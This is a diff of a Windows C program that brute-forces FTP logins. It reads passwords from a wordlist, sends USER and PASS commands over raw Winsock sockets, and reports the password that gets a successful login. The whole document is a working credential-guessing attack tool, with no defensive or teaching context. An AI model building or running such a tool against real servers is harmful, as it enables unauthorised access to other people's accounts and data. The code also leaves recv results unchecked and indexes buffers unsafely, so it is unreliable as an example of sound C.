@@ -3,46 +3,108 @@
 #include <string.h>
 #include <winsock2.h>
 #include <windows.h>
-#include <wininet.h>
 
 #pragma comment(lib, "ws2_32.lib")
-#pragma comment(lib, "wininet.lib")
 
-void usage(char *prog) {
-    printf("Usage: %s -l username -P passwordlist ftp://ip:port\n", prog);
-    exit(1);
+#define BUFFER_SIZE 1024
+
+void print_usage(const char *prog_name) {
+    printf("Usage: %s -l username -P passwordlist ftp://ip:port\n", prog_name);
 }
 
-void try_password(char *ftp_url, char *username, char *password) {
-    HINTERNET hInternet, hFtpSession;
+int connect_to_ftp(const char *ip, int port) {
+    WSADATA wsa;
+    SOCKET sock;
+    struct sockaddr_in server;
 
-    hInternet = InternetOpen("FTP Brute Forcer", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
-    if (hInternet == NULL) {
-        printf("InternetOpen failed with error %lu\n", GetLastError());
+    printf("\nInitialising Winsock...");
+    if (WSAStartup(MAKEWORD(2,2),&wsa) != 0) {
+        printf("Failed. Error Code : %d",WSAGetLastError());
+        return -1;
+    }
+    printf("Initialised.\n");
+
+    if((sock = socket(AF_INET , SOCK_STREAM , 0 )) == INVALID_SOCKET) {
+        printf("Could not create socket : %d" , WSAGetLastError());
+        return -1;
+    }
+
+    server.sin_addr.s_addr = inet_addr(ip);
+    server.sin_family = AF_INET;
+    server.sin_port = htons(port);
+
+    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
+        printf("Connection error: %d\n", WSAGetLastError());
+        return -1;
+    }
+
+    return sock;
+}
+
+int ftp_login(SOCKET sock, const char *username, const char *password) {
+    char buffer[BUFFER_SIZE];
+    int recv_size;
+
+    recv_size = recv(sock, buffer, BUFFER_SIZE, 0);
+    buffer[recv_size] = '\0';
+
+    sprintf(buffer, "USER %s\r\n", username);
+    send(sock, buffer, strlen(buffer), 0);
+    recv_size = recv(sock, buffer, BUFFER_SIZE, 0);
+    buffer[recv_size] = '\0';
+
+    sprintf(buffer, "PASS %s\r\n", password);
+    send(sock, buffer, strlen(buffer), 0);
+    recv_size = recv(sock, buffer, BUFFER_SIZE, 0);
+    buffer[recv_size] = '\0';
+
+    if (strstr(buffer, "230")) {
+        return 1; // Login successful
+    }
+    return 0; // Login failed
+}
+
+void brute_force(const char *username, const char *password_list, const char *ip, int port) {
+    FILE *fp = fopen(password_list, "r");
+    if (!fp) {
+        printf("Cannot open password list file.\n");
         return;
     }
 
-    printf("TRYING PASSPHRASE: %s\n", password);
+    char password[BUFFER_SIZE];
+    while (fgets(password, BUFFER_SIZE, fp)) {
+        password[strcspn(password, "\r\n")] = 0; // Remove newline characters
+        printf("TRYING PASSPHRASE: %s\n", password);
 
-    hFtpSession = InternetConnect(hInternet, ftp_url, INTERNET_DEFAULT_FTP_PORT, username, password, INTERNET_SERVICE_FTP, INTERNET_FLAG_PASSIVE, 0);
-    if (hFtpSession != NULL) {
-        printf("KEY FOUND: [ \"%s\" ]\n", password);
-        InternetCloseHandle(hFtpSession);
-        InternetCloseHandle(hInternet);
-        exit(0);
+        SOCKET sock = connect_to_ftp(ip, port);
+        if (sock == -1) {
+            printf("Connection failed.\n");
+            continue;
+        }
+
+        if (ftp_login(sock, username, password)) {
+            printf("KEY FOUND: [ \"%s\" ]\n", password);
+            closesocket(sock);
+            break;
+        } else {
+            printf("KEY NOT FOUND.\n");
+        }
+        closesocket(sock);
     }
 
-    InternetCloseHandle(hInternet);
+    fclose(fp);
+    WSACleanup();
 }
 
 int main(int argc, char *argv[]) {
-    char *username = NULL;
-    char *password_list = NULL;
-    char *ftp_url = NULL;
-
     if (argc != 6) {
-        usage(argv[0]);
+        print_usage(argv[0]);
+        return 1;
     }
+
+    const char *username = NULL;
+    const char *password_list = NULL;
+    const char *ftp_url = NULL;
 
     for (int i = 1; i < argc; i++) {
         if (strcmp(argv[i], "-l") == 0) {
@@ -50,27 +112,23 @@ int main(int argc, char *argv[]) {
         } else if (strcmp(argv[i], "-P") == 0) {
             password_list = argv[++i];
         } else if (strncmp(argv[i], "ftp://", 6) == 0) {
-            ftp_url = argv[i] + 6; // skip "ftp://"
+            ftp_url = argv[i];
+        } else {
+            print_usage(argv[0]);
+            return 1;
         }
     }
 
-    if (username == NULL || password_list == NULL || ftp_url == NULL) {
-        usage(argv[0]);
-    }
-
-    FILE *fp = fopen(password_list, "r");
-    if (fp == NULL) {
-        perror("Error opening password list");
+    if (!username || !password_list || !ftp_url) {
+        print_usage(argv[0]);
         return 1;
     }
 
-    char password[256];
-    while (fgets(password, sizeof(password), fp) != NULL) {
-        password[strcspn(password, "\r\n")] = 0; // Remove newline characters
-        try_password(ftp_url, username, password);
-    }
+    char ip[BUFFER_SIZE];
+    int port;
+    sscanf(ftp_url, "ftp://%[^:]:%d", ip, &port);
 
-    fclose(fp);
-    printf("KEY NOT FOUND\n");
+    brute_force(username, password_list, ip, port);
+
     return 0;
 }
